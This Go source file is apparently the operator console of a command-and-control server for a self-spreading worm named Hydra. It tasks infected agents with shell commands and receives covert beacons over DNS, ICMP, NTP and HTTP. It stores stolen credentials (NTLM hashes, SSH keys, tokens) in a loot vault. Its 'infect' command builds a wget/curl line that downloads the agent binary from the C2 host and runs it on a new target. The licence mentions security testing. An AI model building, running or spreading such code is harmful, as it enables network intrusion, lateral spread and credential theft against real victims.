
/*
Copyright (c) 2026 José María Micoli
Licensed under AGPLv3

You may:
✔ Study
✔ Modify
✔ Use for internal security testing

You may NOT:
✘ Offer as a commercial service
✘ Sell derived competing products
*/

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"os"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/gdamore/tcell/v2"
	"github.com/gin-gonic/gin"
	"github.com/miekg/dns"
	"github.com/rivo/tview"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// --- CONFIGURATION & STATE ---
const (
	rootDomain  = "c2.hydra-worm.local."
	historyFile = ".hydra_history"
)

var (
	taskMutex    sync.Mutex
	agentTasks   = make(map[string]string)
	agentMutex   sync.Mutex
	activeAgents = make(map[string]*Telemetry)

	// Vault Storage
	lootMutex sync.Mutex
	vault     []Loot

	// UI Metrics
	lastRTT       int
	currentJitter int

	// Command History & Autocomplete
	cmdHistory    []string
	historyIdx    = -1
	knownCommands = []string{"exec", "tasks", "loot", "clear", "exit", "broadcast", "infect", "sessions", "targets","discovery", "show-recon", "help", "usage"}

	// UI Components
	app          *tview.Application
	agentLog     *tview.TextView
	agentList    *tview.Table
	cmdInput     *tview.InputField
	statusFooter *tview.TextView

	// Spinner
	spinnerIdx    = 0
	spinnerFrames = []string{"▰▱▱▱▱", "▰▰▱▱▱", "▰▰▰▱▱", "▰▰▰▰▱", "▰▰▰▰▰", "▱▰▰▰▰", "▱▱▰▰▰", "▱▱▱▰▰", "▱▱▱▱▰"}

	// State tracking for de-duplication (Anti-Flood)
	lastStateMap = make(map[string]string)
	stateMutex   sync.Mutex
)

type Telemetry struct {
	AgentID         string  `json:"a"`
	Transport       string  `json:"t"`
	Status          string  `json:"s"`
	Lambda          float64 `json:"l"`
	Hostname        string  `json:"h"`
	Username        string  `json:"u"`
	OS              string  `json:"o"`
	EnvContext      string  `json:"e"`
	ArtifactPreview string  `json:"p"`
	DefenseProfile  string  `json:"d"`
	ScanResults string `json:"v"`
	LastSeen        time.Time
}

type Loot struct {
	AgentID   string
	Category  string // NTLM, SSH, TOKEN, ENV
	Data      string
	Timestamp time.Time
}

// --- UI: BANNER REPOSITORY ---

func getTacticalHeader() string {
	banners := []string{
		// Banner 1: Cold War / Analog Silo
		`[red:black:b]
  _   _   __  __   ____    ____       _      
 | | | |  \ \/ /  |  _ \  |  _ \     / \     
 | |_| |   \  /   | | | | | |_) |   / _ \    
 |  _  |    | |   | |_| | |  _ <   / ___ \   
 |_| |_|    |_|   |____/  |_| \_\ /_/   \_\  
[white]────────────────────────────────────────────────────────────────────────
[yellow]STATION: DECON_SILO_4 | [red]DEFCON: 3 [white]| [blue]PULSE_LINK: ESTABLISHED[white]
[green]TIER-1: ONLINE | TIER-2: ONLINE | [red]THREAT_LEVEL: CRITICAL[white]`,

		// Banner 2: Modern Cyber Warfare / APT
		`[green:black:b]
 ▄  █ ▄███▄   ▄▄▄▄▄      ▄▄▄▄▀ ▄█    ▄   
█   █ █▀   ▀ █     ▀▄ ▀▀▀ █    ██     █  
██▀▀█ ██▄▄ ▄  ▀▀▀▀▄       █    ██ ██   █ 
█   █ █▄   ▄▀ ▀▄▄▄▄▀     █     ▐█ █ █  █ 
   █  ▀███▀             ▀       ▐ █  █ █ 
[white]────────────────────────────────────────────────────────────────────────
[green]APT_MODE: ACTIVE | [blue]HEARTBEAT: 500ms [white]| [red]DEFENSE_BYPASS: ENABLED[white]
[yellow]NODE: COVERT_B64 | LINK: ENCRYPTED | [green]STATUS: NOMINAL[white]`,

		// Banner 3: Heavy Metal / Brutalist
		`[blue:black:b]
██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ 
██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗
███████║ ╚████╔╝ ██║  ██║██████╔╝███████║
██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║
██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║
[white]────────────────────────────────────────────────────────────────────────
[blue]MODULE: INFECTION_ENGINE | [yellow]OBJECTIVE: NETWORK_SATURATION[white]
[red]SCORCHED_EARTH: READY | [white]UPTIME: 144:12:02 | [blue]SIG_TYPE: ICMP/DNS[white]`,
	}
	rand.Seed(time.Now().UnixNano())
	return banners[rand.Intn(len(banners))]
}

// --- NETWORK LOGIC & HEARTBEAT ---

func LogHeartbeat(transport string, t Telemetry) {
	arrival := time.Now()
	t.Transport = transport
	t.LastSeen = arrival

	// --- FILTRO DE ESTADO (Anti-Flood / Jitter Protection) ---
	stateMutex.Lock()
	lastPreview, exists := lastStateMap[t.AgentID]
	
	// Determinamos si es un cambio sustancial:
	isSubstantiveChange := !exists || (t.ArtifactPreview != lastPreview && t.ArtifactPreview != "")
	
	if !isSubstantiveChange && !strings.HasPrefix(t.ArtifactPreview, "OUT:") {
		stateMutex.Unlock()
		agentMutex.Lock()
		activeAgents[t.AgentID] = &t
		agentMutex.Unlock()
		return 
	}
	
	lastStateMap[t.AgentID] = t.ArtifactPreview
	stateMutex.Unlock()

	// --- PROCESAMIENTO DE LOOT ---
	isNewLoot := IngestLoot(t)

	agentMutex.Lock()
	_, alreadyKnown := activeAgents[t.AgentID]
	activeAgents[t.AgentID] = &t
	agentMutex.Unlock()

	app.QueueUpdateDraw(func() {
		rtt := int(time.Since(arrival).Microseconds())
		if lastRTT != 0 {
			diff := rtt - lastRTT
			if diff < 0 { diff = -diff }
			currentJitter = diff
		}
		lastRTT = rtt

		refreshAgentTable()
		ts := arrival.Format("15:04:05")

		if strings.HasPrefix(t.ArtifactPreview, "OUT:") {
			output := t.ArtifactPreview[4:]
			// Split by newline and print each line to prevent TUI truncation
			lines := strings.Split(output, "\n")
			fmt.Fprintf(agentLog, "[%s] [black:lightgreen][ EXEC_SUCCESS ][-:-] [blue]%s[white] >\n", ts, t.AgentID)
			for _, line := range lines {
				if strings.TrimSpace(line) != "" {
					fmt.Fprintf(agentLog, "  [white]%s\n", line)
				}
			}
		} else if isNewLoot {
			fmt.Fprintf(agentLog, "[%s] [black:yellow][ INTEL_CONFIRMED ][-:-] [blue]%s[white] exfiltrated unique telemetry\n",
				ts, t.AgentID)
		} else if !alreadyKnown {
			fmt.Fprintf(agentLog, "[%s] [blue]NODE_LINKED[white] Agent %s via %s\n",
				ts, t.AgentID, transport)
		}
	})
}

func IngestLoot(t Telemetry) bool {
	if strings.HasPrefix(t.ArtifactPreview, "LOOT:") {
		parts := strings.SplitN(t.ArtifactPreview, ":", 3)
		if len(parts) == 3 {
			category := parts[1]
			data := parts[2]

			lootMutex.Lock()
			defer lootMutex.Unlock()

			for _, item := range vault {
				if item.AgentID == t.AgentID && item.Category == category && item.Data == data {
					return false 
				}
			}

			vault = append(vault, Loot{
				AgentID:   t.AgentID,
				Category:  category,
				Data:      data,
				Timestamp: time.Now(),
			})
			return true 
		}
	}
	return false
}

// --- LISTENER PROTOCOLS (ICMP, DNS, NTP) ---

func parseHydraDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true
	for _, q := range r.Question {
		rawName := strings.TrimSuffix(q.Name, ".")
		cleanRoot := strings.TrimSuffix(rootDomain, ".")
		if strings.HasSuffix(strings.ToLower(rawName), strings.ToLower(cleanRoot)) {
			payloadPart := rawName[:len(rawName)-len(cleanRoot)-1]
			encodedPayload := strings.ReplaceAll(payloadPart, ".", "")
			normalized := strings.ReplaceAll(encodedPayload, "-", "+")
			normalized = strings.ReplaceAll(normalized, "_", "/")
			for len(normalized)%4 != 0 {
				normalized += "="
			}
			decoded, err := base64.RawURLEncoding.DecodeString(encodedPayload)
			if err != nil {
				decoded, _ = base64.StdEncoding.DecodeString(normalized)
			}
			if decoded != nil {
				var t Telemetry
				if err := json.Unmarshal(decoded, &t); err == nil {
					LogHeartbeat("DNS (Tier 6)", t)
					rr, _ := dns.NewRR(fmt.Sprintf("%s 60 IN A 127.0.0.1", q.Name))
					msg.Answer = append(msg.Answer, rr)
				}
			}
		}
	}
	w.WriteMsg(msg)
}

func StartIcmpListener() {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil { return }
	for {
		rb := make([]byte, 1500)
		n, peer, _ := conn.ReadFrom(rb)
		msg, _ := icmp.ParseMessage(1, rb[:n])
		if msg != nil && msg.Type == ipv4.ICMPTypeEcho {
			body, _ := msg.Body.Marshal(1)
			if len(body) > 4 {
				processRawPayload(body[4:], peer.String(), "ICMP (Tier 4)")
			}
			echoBody := msg.Body.(*icmp.Echo)
			reply := icmp.Message{
				Type: ipv4.ICMPTypeEchoReply, Code: 0,
				Body: &icmp.Echo{ID: echoBody.ID, Seq: echoBody.Seq, Data: []byte("HYDRA_ACK")},
			}
			mb, _ := reply.Marshal(nil)
			conn.WriteTo(mb, peer)
		}
	}
}

func StartNtpListener() {
	addr, _ := net.ResolveUDPAddr("udp", ":123")
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	for {
		buf := make([]byte, 1500)
		n, remoteAddr, err := conn.ReadFromUDP(buf)
		if err != nil {
			continue
		}
		if n >= 48 {
			processRawPayload(buf[48:n], remoteAddr.String(), "NTP (Tier 5)")
			response := make([]byte, 48+5)
			copy(response[0:48], buf[0:48])
			copy(response[48:], []byte("T-ACK"))
			conn.WriteToUDP(response, remoteAddr)
		}
	}
}

func processRawPayload(data []byte, peer string, tier string) {
	rawStr := strings.ReplaceAll(string(data), ".", "")
	decoded, _ := base64.RawURLEncoding.DecodeString(rawStr)
	if decoded == nil {
		decoded, _ = base64.StdEncoding.DecodeString(rawStr)
	}
	if decoded != nil {
		var t Telemetry
		if err := json.Unmarshal(decoded, &t); err == nil {
			LogHeartbeat(tier, t)
		}
	}
}

// --- UI HELPERS ---

func refreshAgentTable() {
	agentList.Clear()
	headers := []string{"NODE_ID", "COMMS_CHANNEL", "USER_CONTEXT", "SECURITY_PROFILE", "RTT_LATENCY"}
	for c, h := range headers {
		agentList.SetCell(0, c, tview.NewTableCell("[black:blue] "+h+" ").SetSelectable(false).SetAlign(tview.AlignCenter))
	}

	agentMutex.Lock()
	keys := make([]string, 0, len(activeAgents))
	for k := range activeAgents { keys = append(keys, k) }
	sort.Strings(keys)

	for r, k := range keys {
		t := activeAgents[k]
		agentList.SetCell(r+1, 0, tview.NewTableCell("[blue]"+t.AgentID))
		agentList.SetCell(r+1, 1, tview.NewTableCell(t.Transport))
		agentList.SetCell(r+1, 2, tview.NewTableCell(fmt.Sprintf("%s@%s", t.Username, t.Hostname)))
		agentList.SetCell(r+1, 3, tview.NewTableCell("[red]"+t.DefenseProfile))
		agentList.SetCell(r+1, 4, tview.NewTableCell(fmt.Sprintf("%d µs", lastRTT)))
	}
	agentMutex.Unlock()
}

func printHelp() {
	ts := time.Now().Format("15:04:05")
	helpText := `
[blue:black:b] HYDRA C2 TACTICAL MANUAL [-:-:-]
[yellow]COMMAND      | DESCRIPTION                               | USAGE[-:]
[white]exec         | Task a specific node with a shell command | exec <ID> <CMD>
tasks        | View all currently queued/pending tasks   | tasks
broadcast    | Task ALL active nodes simultaneously      | broadcast <CMD>
discovery    | Map Layer-2 (ARP) and Layer-3 (Routing)   | discovery
show-recon   | Render the aggregated network topology    | show-recon
infect       | Pivot: Task node to infect another target | infect <SourceID> <TargetIP>
loot         | Access the vault of exfiltrated data      | loot
sessions     | List all the infected assets              | sessions
targets      | List neighbors not infected - TARGETS     | targets
clear        | Flush the transmission log display        | clear
help/usage   | Display this tactical manual              | help
exit         | Initiate Scorched Earth shutdown          | exit
`
	fmt.Fprintf(agentLog, "[%s] %s\n", ts, helpText)
}

// RenderDiscoveryTables displays the aggregated network topology harvested from agents
func RenderDiscoveryTables() {
	ts := time.Now().Format("15:04:05")
	fmt.Fprintf(agentLog, "[%s] [blue:black:b] ENHANCED NETWORK TOPOLOGY MAP [-:-:-]\n", ts)

	// --- TARGET_HOSTS TABLE ---
	fmt.Fprintf(agentLog, "\n[yellow]┌────────────────── TARGET_HOSTS ──────────────────┐[-]\n")
	fmt.Fprintf(agentLog, "[yellow]│ IP_ADDRESS    | MAC_ADDR          | SOURCE_NODE  │[-]\n")
	fmt.Fprintf(agentLog, "[yellow]├──────────────────────────────────────────────────┤[-]\n")
	
	agentMutex.Lock()
	hasHosts := false
	for _, t := range activeAgents {
		// Scans the neighbor data reported in ScanResults (v)
		if t.ScanResults != "" && !strings.Contains(t.ScanResults, "default") {
		    lines := strings.Split(t.ScanResults, "\n")
		    for _, line := range lines {
		        if strings.Contains(line, "lladdr") {
		            fmt.Fprintf(agentLog, "  %s\n", line)
		            hasHosts = true
		        }
		    }
		}
	}
	if !hasHosts {
		fmt.Fprintf(agentLog, "  [white] (Pending ARP exfiltration from agents...) \n")
	}
	fmt.Fprintf(agentLog, "[yellow]└──────────────────────────────────────────────────┘[-]\n")

	// --- TARGET_NETWORKS TABLE ---
	fmt.Fprintf(agentLog, "\n[blue]┌──────────────── TARGET_NETWORKS ─────────────────┐[-]\n")
	fmt.Fprintf(agentLog, "[blue]│ SUBNET/CIDR   | GATEWAY           | INTERFACE    │[-]\n")
	fmt.Fprintf(agentLog, "[blue]├──────────────────────────────────────────────────┤[-]\n")
	
	hasNets := false
	for _, t := range activeAgents {
		if strings.Contains(t.ScanResults, "default") || strings.Contains(t.ScanResults, "10.5.0") {
			lines := strings.Split(t.ScanResults, "\n")
			for _, line := range lines {
				if strings.Contains(line, "dev eth") {
					fmt.Fprintf(agentLog, "  [white]%-15s | %-12s | %s\n", t.AgentID, "Route:", line)
					hasNets = true
				}
			}
		}
	}
	if !hasNets {
		fmt.Fprintf(agentLog, "  [white] (Pending routing table telemetry...) \n")
	}
	fmt.Fprintf(agentLog, "[blue]└──────────────────────────────────────────────────┘[-]\n")
	agentMutex.Unlock()
}

func handleCommand(cmd string) {
	ts := time.Now().Format("15:04:05")
	fields := strings.Fields(cmd)
	if len(fields) == 0 {
		return
	}

	switch strings.ToLower(fields[0]) {
	case "help", "usage":
        printHelp()
	case "exec":
		if len(fields) < 3 {
			fmt.Fprintf(agentLog, "[%s] [red]ERROR:[white] Usage: exec <ID> <CMD>\n", ts)
			return
		}
		targetID := fields[1]
		command := strings.Join(fields[2:], " ")
		taskMutex.Lock()
		agentTasks[targetID] = command
		taskMutex.Unlock()
		fmt.Fprintf(agentLog, "[%s] [yellow]MISSION_QUEUED >[white] Objective for %s: %s\n", ts, targetID, command)
	case "tasks":
		taskMutex.Lock()
		fmt.Fprintf(agentLog, "[%s] [blue]BUFFER_DUMP:[white]\n", ts)
		for id, c := range agentTasks {
			fmt.Fprintf(agentLog, "  - %s -> %s\n", id, c)
		}
		taskMutex.Unlock()
	case "sessions":
		agentMutex.Lock()
		ts := time.Now().Format("15:04:05")
		fmt.Fprintf(agentLog, "[%s] [blue]ACTIVE_SESSION_TABLE:[-:-]\n", ts)
		fmt.Fprintf(agentLog, "  %-15s | %-15s | %-12s | %s\n", "NODE_ID", "INTERNAL_IP", "USER", "OS")
		fmt.Fprintf(agentLog, "  ------------------------------------------------------------\n")
		for id, t := range activeAgents {
			fmt.Fprintf(agentLog, "  %-15s | %-15s | %-12s | %s\n", id, t.Hostname, t.Username, t.OS)
		}
		agentMutex.Unlock()

	case "targets":
		ts := time.Now().Format("15:04:05")
		c2IP := "10.5.0.5" 
		fmt.Fprintf(agentLog, "[%s] [blue]NETWORK_SCAN_REPORT:[-:-]\n", ts)
		fmt.Fprintf(agentLog, "  %-15s | %-12s | %s\n", "POTENTIAL_IP", "SOURCE_NODE", "STATUS")
		fmt.Fprintf(agentLog, "  ------------------------------------------------------------\n")
		
		seenTargets := make(map[string]bool)
		agentMutex.Lock()
		for _, t := range activeAgents {
			// CHECK BOTH: ArtifactPreview (p) AND ScanResults (v) fields
			rawData := ""
			if strings.HasPrefix(t.ArtifactPreview, "SCAN:") {
				rawData = strings.TrimPrefix(t.ArtifactPreview, "SCAN:")
			} else if t.ScanResults != "" {
				rawData = t.ScanResults
			}

			if rawData != "" {
				ips := strings.Split(rawData, ",")
				for _, ip := range ips {
					ip = strings.TrimSpace(ip)
					// Filter out C2, Loopback, and duplicates
					if ip == "" || seenTargets[ip] || ip == "127.0.0.1" || ip == c2IP {
						continue
					}

					isInfected := false
					for _, active := range activeAgents {
						if active.Hostname == ip {
							isInfected = true
							break
						}
					}

					if !isInfected {
						fmt.Fprintf(agentLog, "  %-15s | %-12s | [red]NOT_INFECTED[-:-]\n", ip, t.AgentID)
						seenTargets[ip] = true
					}
				}
			}
		}
		agentMutex.Unlock()
	case "discovery":
		ts := time.Now().Format("15:04:05")
		fmt.Fprintf(agentLog, "[%s] [blue]TRIGGERING AUTONOMOUS AGENT DISCOVERY...[-:-]\n", ts)
		
		agentMutex.Lock()
		taskMutex.Lock()
		count := 0
		for id := range activeAgents {
			// Now we only send the keyword; the Agent's internal logic handles the ping and scraping
			agentTasks[id] = "discovery"
			count++
		}
		taskMutex.Unlock()
		agentMutex.Unlock()
		fmt.Fprintf(agentLog, "[%s] [yellow]SIGNAL_SENT >[white] %d agents initiating internal recon\n", ts, count)

	case "show-recon":
		RenderDiscoveryTables()
	case "loot":
		lootMutex.Lock()
		if len(vault) == 0 {
			fmt.Fprintf(agentLog, "[%s] [yellow]VAULT_EMPTY:[white] No data exfiltrated.\n", ts)
		} else {
			fmt.Fprintf(agentLog, "[%s] [blue]ENCRYPTED_VAULT_ACCESS:[white]\n", ts)
			for _, item := range vault {
				fmt.Fprintf(agentLog, "  [cyan]%s[white] | [yellow]%s[white] | %s\n",
					item.AgentID, item.Category, item.Data)
			}
		}
		lootMutex.Unlock()
	case "broadcast":
		if len(fields) < 2 {
			fmt.Fprintf(agentLog, "[%s] [red]ERROR:[white] Usage: broadcast <CMD>\n", ts)
			return
		}
		command := strings.Join(fields[1:], " ")
		agentMutex.Lock()
		taskMutex.Lock()
		count := 0
		for id := range activeAgents {
			agentTasks[id] = command
			count++
		}
		taskMutex.Unlock()
		agentMutex.Unlock()
		fmt.Fprintf(agentLog, "[%s] [yellow]BROADCAST_SENT >[white] Tasked %d nodes with: %s\n", ts, count, command)
	case "infect":
			if len(fields) < 3 {
				fmt.Fprintf(agentLog, "[%s] [red]ERROR:[white] Usage: infect <SourceID> <TargetIP>\n", ts)
				return
			}
			sourceID := fields[1]
			targetIP := fields[2]
			
			// LotL Implementation updated for the Gamma (10.5.0.12) scenario
			// We use the C2 (10.5.0.5) as the delivery server defined in your gin router
			payloadCmd := fmt.Sprintf("(wget -q http://10.5.0.5:8080/dist/hydra-agent -O /tmp/h-agent || curl -sL http://10.5.0.5:8080/dist/hydra-agent -o /tmp/h-agent) && chmod +x /tmp/h-agent && /tmp/h-agent &")
			
			taskMutex.Lock()
			agentTasks[sourceID] = fmt.Sprintf("PROPAGATE %s %s", targetIP, payloadCmd)
			taskMutex.Unlock()
			
			fmt.Fprintf(agentLog, "[%s] [yellow]INFECTION_INITIATED[white] > Node %s tasked to pivot to %s\n", ts, sourceID, targetIP)
	case "clear":
		agentLog.Clear()
	case "exit":
		initiateShutdown()
	default:
		fmt.Fprintf(agentLog, "[%s] [red]COMMAND FAILURE:[white] [%s] is not a valid tactical verb.\n", ts, fields[0])
	}
}

func initiateShutdown() {
	agentLog.Clear()
	fmt.Fprintf(agentLog, "[red:black:b]!!! INITIATING SCORCHED EARTH PROTOCOL !!![white]\n")
	go func() {
		steps := []string{"Wiping RSA Keypairs...", "Flushing Signal Buffers...", "Dismantling Channels...", "Hardware Halt."}
		for _, step := range steps {
			time.Sleep(200 * time.Millisecond)
			app.QueueUpdateDraw(func() { fmt.Fprintf(agentLog, "[red]SHUTDOWN:[white] %s\n", step) })
		}
		time.Sleep(300 * time.Millisecond)
		app.Stop()
	}()
}

func main() {
	app = tview.NewApplication()

	if data, err := os.ReadFile(historyFile); err == nil {
		cmdHistory = strings.Split(strings.TrimSpace(string(data)), "\n")
	}

	header := tview.NewTextView().SetDynamicColors(true).SetTextAlign(tview.AlignCenter).
		SetText(getTacticalHeader())

	agentList = tview.NewTable().SetBorders(false)
	agentList.SetTitle(" [blue]ACTIVE_SPECTRUM[white] ").SetBorder(true).SetBorderColor(tcell.GetColor("blue"))
	refreshAgentTable()

	agentLog = tview.NewTextView().SetDynamicColors(true).SetWordWrap(true).SetChangedFunc(func() {
		app.Draw()
		agentLog.ScrollToEnd()
	})
	agentLog.SetTitle(" [white]ENCRYPTED TRANSMISSIONS[white] ").SetBorder(true).SetBorderColor(tcell.GetColor("green"))

	statusFooter = tview.NewTextView().SetDynamicColors(true)

	cmdInput = tview.NewInputField().
		SetLabel("[blue]HYDRA/INT> [white]").
		SetFieldBackgroundColor(tcell.ColorBlack)
	cmdInput.SetBorder(true).SetBorderColor(tcell.GetColor("blue"))

	cmdInput.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		switch event.Key() {
		case tcell.KeyUp:
			if len(cmdHistory) > 0 {
				if historyIdx == -1 {
					historyIdx = len(cmdHistory) - 1
				} else if historyIdx > 0 {
					historyIdx--
				}
				cmdInput.SetText(cmdHistory[historyIdx])
			}
			return nil
		case tcell.KeyDown:
			if historyIdx != -1 && historyIdx < len(cmdHistory)-1 {
				historyIdx++
				cmdInput.SetText(cmdHistory[historyIdx])
			} else {
				historyIdx = -1
				cmdInput.SetText("")
			}
			return nil
		case tcell.KeyTab:
			current := cmdInput.GetText()
			for _, cmd := range knownCommands {
				if strings.HasPrefix(cmd, current) {
					cmdInput.SetText(cmd)
					break
				}
			}
			return nil
		}
		return event
	})

	cmdInput.SetDoneFunc(func(key tcell.Key) {
		if key == tcell.KeyEnter {
			text := cmdInput.GetText()
			if text != "" {
				handleCommand(text)
				cmdHistory = append(cmdHistory, text)
				f, _ := os.OpenFile(historyFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				f.WriteString(text + "\n")
				f.Close()
			}
			cmdInput.SetText("")
			historyIdx = -1
		}
	})

	flex := tview.NewFlex().SetDirection(tview.FlexRow).
		AddItem(header, 10, 1, false).
		AddItem(tview.NewFlex().AddItem(agentList, 45, 1, false).AddItem(agentLog, 0, 2, false), 0, 4, false).
		AddItem(statusFooter, 1, 1, false).
		AddItem(cmdInput, 3, 1, true)

	go StartIcmpListener()
	go StartNtpListener()
	go func() {
		dns.HandleFunc(rootDomain, parseHydraDNS)
		dns.ListenAndServe(":53", "udp", nil)
	}()

	gin.SetMode(gin.ReleaseMode)
	r := gin.New()
	r.StaticFile("/dist/hydra-agent", "./bin/hydra-agent")

	r.POST("/api/v1/cloud-mock", func(c *gin.Context) {
		if c.GetHeader("Authorization") != "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9" {
			c.JSON(401, gin.H{"error": "Unauthorized"})
			return
		}
		var t Telemetry
		if err := c.ShouldBindJSON(&t); err == nil {
			LogHeartbeat("CLOUD (Tier 1)", t)
			taskMutex.Lock()
			task := "WAIT"
			if cmd, exists := agentTasks[t.AgentID]; exists {
				task = cmd
				delete(agentTasks, t.AgentID)
			}
			taskMutex.Unlock()
			c.JSON(200, gin.H{"status": "verified", "task": task, "epoch": time.Now().Unix()})
		}
	})

	r.POST("/api/v1/heartbeat", func(c *gin.Context) {
		var t Telemetry
		if err := c.ShouldBindJSON(&t); err == nil {
			LogHeartbeat("HTTPS (Tier 2)", t)
			c.JSON(200, gin.H{"status": "ok", "task": "NOP", "epoch": time.Now().Unix()})
		}
	})
	go r.Run(":8080")

	go func() {
		for {
			time.Sleep(250 * time.Millisecond)
			app.QueueUpdateDraw(func() {
				spinnerIdx = (spinnerIdx + 1) % len(spinnerFrames)
				ts := time.Now().Format("15:04:05")
				statusFooter.SetText(fmt.Sprintf(
					" [blue]SYNC_PULSE %s [white]| [yellow]T_STAMP: %s | [red]LATENCY: %d µs [white]| [magenta]JITTER: %d µs [white]| [blue]ENCRYPTION: AES-256-GCM/X25519",
					spinnerFrames[spinnerIdx], ts, lastRTT, currentJitter))
			})
		}
	}()

	if err := app.SetRoot(flex, true).EnableMouse(true).Run(); err != nil {
		panic(err)
	}
}